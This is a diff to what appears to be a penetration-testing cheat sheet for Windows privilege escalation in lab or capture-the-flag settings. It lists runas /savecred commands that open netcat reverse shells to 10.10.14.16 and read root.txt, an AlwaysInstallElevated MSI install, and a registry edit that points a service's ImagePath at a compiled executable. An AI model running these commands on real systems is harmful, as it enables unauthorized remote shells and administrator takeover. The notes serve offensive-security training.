@@ -105,3 +105,16 @@ Two types:
 `runas /user:Administrator /savecred "nc.exe -c cmd.exe 10.10.14.16 9006"`
 `C:\Windows\System32\runas.exe /user:ACCESS\Administrator /savecred "C:\Windows\System32\cmd.exe /c C:\Users\Public\nc.exe -e cmd.exe x.x.x.x"`
 `C:\Windows\System32\runas.exe /user:ACCESS\Administrator /savecred "C:\Windows\System32\cmd.exe /c TYPE C:\Users\Administrator\root.txt > C:\Users\security\root.txt"`
+
+## AlwaysInstallElevated 
+
+**Running an MSI**
+msiexec /quiet /qn /i C:\Temp\setup.msi
+
+## Registry
+
+**Compile c for windows on Kali**
+x86_64-w64-mingw32-gcc windows_service.c -o x.exe 
+
+**Add executable to image path**
+ reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\x.exe /f
